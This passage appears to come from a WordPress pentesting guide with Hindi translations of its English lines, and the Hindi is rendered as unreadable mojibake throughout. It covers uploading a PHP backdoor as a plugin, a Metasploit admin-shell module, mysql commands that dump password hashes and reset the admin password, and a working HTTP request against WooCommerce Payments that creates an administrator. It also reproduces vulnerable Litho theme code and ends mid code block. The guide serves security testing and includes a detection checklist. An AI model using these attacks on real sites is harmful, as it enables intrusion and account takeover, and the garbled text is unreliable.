рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП рдкреЗрдЬ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣рд╛рдВ рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
рд╕реЗрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
.php рдлрд╛рдЗрд▓реЛрдВ рдХреЛ plugin рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
Create your php backdoor using for example:
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ php backdoor рдмрдирд╛рдПрдВ:

![](<../../images/image (183).png>)

Then add a new plugin:
рдлрд┐рд░ рдПрдХ рдирдпрд╛ plugin рдЬреЛрдбрд╝реЗрдВ:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:
Plugin рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ Install Now рджрдмрд╛рдПрдБ:

![](<../../images/image (249).png>)

Click on Procced:
Procced рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:
рд╕рдВрднрд╡рддрдГ рдЗрд╕рд╕реЗ рдХреБрдЫ рднреА рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк Media рдореЗрдВ рдЬрд╛рдПрдБрдЧреЗ, рддреЛ рдЖрдкрдХреЛ рдЖрдкрдХрд╛ shell рдЕрдкрд▓реЛрдб рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:
рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ рдФрд░ рдЖрдкрдХреЛ reverse shell рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin
### Malicious plugin рдХреЛ рдЕрдкрд▓реЛрдб рдФрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:
рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рдРрд╕реА malicious plugin рдХреА installation рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ рдЬреЛ рдЬреНрдЮрд╛рдд рд░реВрдк рд╕реЗ vulnerable рд╣реИ рдФрд░ рдЬрд┐рд╕рдХрд╛ рдкреНрд░рдпреЛрдЧ web shell рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рдореНрди рдкреНрд░рдХрд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
1. **Plugin Acquisition**: plugin рдХреЛ Exploit DB рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
2. **Plugin Installation**:
- WordPress dashboard рдкрд░ рдЬрд╛рдПрдБ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдБред
- рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП plugin рдХрд╛ zip рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ plugin рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ install рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рдЗрд╕реЗ dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ activate рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.
4. **Exploitation**:
- "reflex-gallery" plugin install рдФрд░ activate рд╣реЛрдиреЗ рдкрд░ exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЬреНрдЮрд╛рдд рд░реВрдк рд╕реЗ vulnerable рд╣реИред
- Metasploit framework рдЗрд╕ vulnerability рдХреЗ рд▓рд┐рдП рдПрдХ exploit рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд module рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ specific commands execute рдХрд░рдХреЗ, рдПрдХ meterpreter session рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдЗрдЯ рддрдХ unauthorized access рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ WordPress рд╕рд╛рдЗрдЯ рдХреЛ exploit рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХреЗрд╡рд▓ рдПрдХ рд╣реИред

The content includes visual aids depicting the steps in the WordPress dashboard for installing and activating the plugin. However, it's important to note that exploiting vulnerabilities in this manner is illegal and unethical without proper authorization. This information should be used responsibly and only in a legal context, such as penetration testing with explicit permission.
рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдореЗрдВ plugin рдХреЛ install рдФрд░ activate рдХрд░рдиреЗ рдХреЗ WordPress dashboard рдХреЗ рдЪрд░рдгреЛрдВ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓реЗ рджреГрд╢реНрдп рд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдмрд┐рдирд╛ рдЙрдЪрд┐рдд authorization рдХреЗ vulnerabilities рдХреЛ рдЗрд╕ рддрд░рд╣ exploit рдХрд░рдирд╛ illegal рдФрд░ unethical рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рд╕рдВрджрд░реНрдн рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ penetration testing рдХреЗ рджреМрд░рд╛рди рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рдеред

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE
## XSS рд╕реЗ RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ рдРрд╕рд╛ script рд╣реИ рдЬреЛ Cross-Site Scripting (XSS) vulnerability рдХреЛ Remote Code Execution (RCE) рдпрд╛ рдЕрдиреНрдп critical vulnerabilities рдореЗрдВ escalate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП design рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ WordPress рдореЗрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). рдпрд╣ Wordpress Versions 6.X.X, 5.X.X рдФрд░ 4.X.X рдХреЗ рд▓рд┐рдП support рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рдореНрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**Privilege Escalation:**_ WordPress рдореЗрдВ рдПрдХ user рдмрдирд╛рддрд╛ рд╣реИред
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ рдЕрдкрдирд╛ custom plugin (backdoor) WordPress рдкрд░ upload рдХрд░реЗрдВред
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Plugin Edit:**_ WordPress рдореЗрдВ Built-In Plugins рдХреЛ edit рдХрд░реЗрдВред
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(RCE) Built-In Theme Edit:**_ WordPress рдореЗрдВ Built-In Themes рдХреЛ edit рдХрд░реЗрдВред
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes рдХреЗ рд▓рд┐рдП Custom Exploitsред

## Post Exploitation
## Post Exploitation

Extract usernames and passwords:
рдпреВрдЬрд╝рд░рдиреЗрдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress рдкреНрд▓рдЧрдЗрдиреНрд╕ Pentest

### рд╣рдорд▓рд╛ рд╕рддрд╣

рдХрд┐рд╕ рддрд░рд╣ рдПрдХ Wordpress plugin рдЕрдкрдиреА functionality рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╣ рдЬрд╛рдирдирд╛ рдЙрд╕рдХреА functionality рдореЗрдВ рдореМрдЬреВрдж vulnerabilities рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдмреБрд▓реЗрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ plugin рдХрд┐рд╕ рддрд░рд╣ functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ vulnerable plugins рдХреЗ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ [**blog post**](https://nowotarski.info/wordpress-nonce-authorization/) рдореЗрдВ рджрд┐рдП рдЧрдП рд╣реИрдВред

- **`wp_ajax`**

  Plugin рджреНрд╡рд╛рд░рд╛ functions рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рддрд░реАрдХрд╛ AJAX handlers рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИред рдЗрдирдореЗрдВ logic, authorization, рдпрд╛ authentication рдмрдЧ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдХреНрд╕рд░ рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдпреЗ functions authentication рдФрд░ authorization рджреЛрдиреЛрдВ рдХреЛ рдПрдХ wordpress nonce рдХреА рдореМрдЬреВрджрдЧреА рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХрд░ рджреЗрддреЗ рд╣реИрдВ рдЬреЛ **Wordpress instance рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** (рдЙрд╕рдХреА role рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛)ред

  рдпреЗ рд╡реЗ functions рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ plugin рдореЗрдВ рдХрд┐рд╕реА function рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` рдХрд╛ рдЙрдкрдпреЛрдЧ endpoint рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдпреЛрдЧреНрдп рдмрдирд╛ рджреЗрддрд╛ рд╣реИ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреА)ред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдпрд╣ рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ; рдпрд╣ рдЖрдо рддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА role рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИред

- **REST API**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ wordpress рд╕реЗ `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ REST API рдХреЗ рдЬрд╝рд░рд┐рдП рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рдП:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` рдПрдХ callback рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рджрд┐рдпрд╛ рдЧрдпрд╛ user API method рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП authorized рд╣реИ рдпрд╛ рдирд╣реАрдВред

**рдЕрдЧрд░ built-in `__return_true` function рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ user permissions рдЪреЗрдХ рдХреЛ рдмрд╕ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрдЧрд╛ред**

- **php рдлрд╝рд╛рдЗрд▓ рддрдХ рдкреНрд░рддреНрдпрдХреНрд╖ рдкрд╣реБрдБрдЪ**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ plugins рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╡реЗрдм рд╕реЗ рд╕реАрдзреЗ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдХреЛрдИ plugin рдХрд┐рд╕реА рднреА vulnerable functionality рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдорд╛рддреНрд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╡рд╣ рдХрд┐рд╕реА рднреА user рджреНрд╡рд╛рд░рд╛ exploit рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

### Trusted-header REST impersonation (WooCommerce Payments тЙд 5.6.1)

рдХреБрдЫ plugins internal integrations рдпрд╛ reverse proxies рдХреЗ рд▓рд┐рдП тАЬtrusted headerтАЭ shortcuts рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ REST requests рдХреЗ рд▓рд┐рдП current user context рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ header рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ header рдХреЛ рдХрд┐рд╕реА upstream component рджреНрд╡рд╛рд░рд╛ cryptographically request рд╕реЗ рдмрд╛рдБрдзрд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ attacker рдЗрд╕реЗ spoof рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ privileged REST routes рдХреЛ administrator рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- рдкреНрд░рднрд╛рд╡: core users REST route рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирдпрд╛ administrator рдмрдирд╛рдХрд░ unauthenticated privilege escalation рдХреЗ рдЬрд░рд┐рдП admin рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдирд╛ред
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1 рдХреЛ рдЬрдмрд░рджрд╕реНрддреА рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЖрдо рддреМрд░ рдкрд░ рдкрд╣рд▓рд╛ administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- рдкреНрд▓рдЧрдЗрди рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рд╣рд┐рдд рд╣реЗрдбрд░ рдХреЛ authentication state рд╕реЗ рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ capability checks рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджреЗрддрд╛ рд╣реИред
- WordPress core рдЗрд╕ route рдХреЗ рд▓рд┐рдП `create_users` capability рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ; рдкреНрд▓рдЧрдЗрди hack рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджреЗрддрд╛ рд╣реИ рд╣реЗрдбрд░ рд╕реЗ рд╕реАрдзреЗ current user context рд╕реЗрдЯ рдХрд░рдХреЗред

Expected success indicators

- HTTP 201 рдПрдХ JSON рдмреЙрдбреА рдХреЗ рд╕рд╛рде рдЬреЛ рдмрдирд╛рдП рдЧрдП user рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддреА рд╣реИред
- рдПрдХ рдирдпрд╛ admin user рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ `wp-admin/users.php` рдореЗрдВред

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']`, рдпрд╛ рдРрд╕реЗ vendor SDKs рдХреЗ рд▓рд┐рдП grep рдХрд░реЗрдВ рдЬреЛ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░реНрд╕ рдкрдврд╝рдХрд░ user context рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- рдЙрди REST registrations рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрд┐рдирдХреЗ privileged callbacks рдореЗрдВ рдордЬрдмреВрдд `permission_callback` рдЪреЗрдХ рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рдЬреЛ request headers рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред
- рдРрд╕реЗ REST handlers рдореЗрдВ core user-management functions (`wp_insert_user`, `wp_create_user`) рдХреЗ рдЙрдкрдпреЛрдЧ рдвреВрдВрдвреЗрдВ рдЬреЛ рдХреЗрд╡рд▓ header values рд╕реЗ рдЧреЗрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВред

### wp_ajax_nopriv рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╣рдЯрд╛рдирд╛ (Litho Theme <= 3.0)

WordPress themes рдФрд░ plugins рдЕрдХреНрд╕рд░ `wp_ajax_` рдФрд░ `wp_ajax_nopriv_` hooks рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ AJAX handlers рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм **_nopriv_** variant рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддрд╛ рд╣реИ **рддреЛ callback рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рд╡рд┐рдЬрд╝рд┐рдЯрд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХрд┐рд╕реА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдк рд╕реЗ рдирд┐рдореНрди рд▓рд╛рдЧреВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:

1. рдПрдХ **capability check** (рдЬреИрд╕реЗ `current_user_can()` рдпрд╛ рдХрдо рд╕реЗ рдХрдо `is_user_logged_in()`), рдФрд░
2. рдПрдХ **CSRF nonce** рдЬреЛ `check_ajax_referer()` / `wp_verify_nonce()` рд╕реЗ validate рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдФрд░
3. **рдХрдареЛрд░ рдЗрдирдкреБрдЯ sanitisation / validation**ред

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХреА рдЧрдИ рд╕рдорд╕реНрдпрд╛рдПрдБ:

* **рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд рдкрд╣реБрдБрдЪ** тАУ `wp_ajax_nopriv_` hook рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **Nonce / capability рдЪреЗрдХ рдирд╣реАрдВ** тАУ рдХреЛрдИ рднреА рдЖрдЧрдВрддреБрдХ рдЗрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдкрд╛рде рд╕реИрдиреАрдЯрд╛рдЗрдЬрд╝реЗрд╢рди рдирд╣реАрдВ** тАУ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдирд┐рдпрдВрддреНрд░рд┐рдд `fontfamily` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдмрд┐рдирд╛ рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдкрд╛рде рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ `../../` traversal рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХрд▓ HTTP POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ **uploads рдмреЗрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдиреАрдЪреЗ** (рдЖрдорддреМрд░ рдкрд░ `<wp-root>/wp-content/uploads/`) рд╕реЗ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
